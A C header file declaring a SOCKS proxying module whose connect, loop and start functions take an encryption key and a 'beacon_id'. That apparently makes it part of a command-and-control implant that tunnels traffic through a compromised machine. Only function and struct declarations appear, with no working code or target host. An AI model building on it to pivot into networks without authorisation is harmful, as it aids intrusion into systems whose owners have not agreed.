#ifndef SOCKS_H
#define SOCKS_H

#include <stdint.h>

#define MAX_SOCKS_CHANNELS 64

typedef struct {
    volatile int active;
    uint32_t     channel_id;
    int          remote_sock;
} socks_channel_t;

void socks_init(void);
int  socks_tcp_connect(const char *host, uint16_t port,
                       const uint8_t *key, uint32_t beacon_id);
void socks_loop(int sock, const uint8_t *key, uint32_t beacon_id);
int  socks_start(const char *host, uint16_t port,
                 const uint8_t *key, uint32_t beacon_id);
void socks_cleanup(void);

#endif
